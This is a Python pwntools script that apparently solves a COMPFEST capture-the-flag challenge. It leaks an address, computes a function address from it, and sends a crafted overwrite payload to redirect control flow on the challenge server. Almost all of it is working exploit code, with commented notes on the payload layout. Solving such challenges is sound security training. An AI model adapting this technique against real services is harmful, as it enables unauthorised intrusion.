from pwn import *

def recvmenu():
    for i in range(8):
        print(conn.recvline())

conn = remote('challenges.ctf.compfest.id', 20008)

recvmenu()

conn.sendline(b'2')
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
# Get the treasure
harta_karun = conn.recvline()[18:30]
# Calculate `salty_spitoon` address
salty_spitoon = str(hex(int(harta_karun, 16) - 171))[2:]
# Convert to lil endian
target = b''
for i in range(0,len(salty_spitoon),2):
    target += int(salty_spitoon[10-i:12-i], 16).to_bytes(1)
target += b'\x00\x00'
print(target)

recvmenu()

conn.sendline(b'1')
payload = ("\x00"*60+"\x01"+"\x00"*3+"\x01"+"\x00"*7).encode("utf-8") + target
print(payload)
conn.sendline(payload)
print(conn.recvline())

recvmenu()

conn.sendline(b'3')
# goooooooooooooooooooooooooooooo
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())
print(conn.recvline())

# --:310a
# 60:000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
# 01:01
# 03:000000
# 01:01
# 07:00000000000000
# <>:89f2aafcb0550000
# --:0a330a
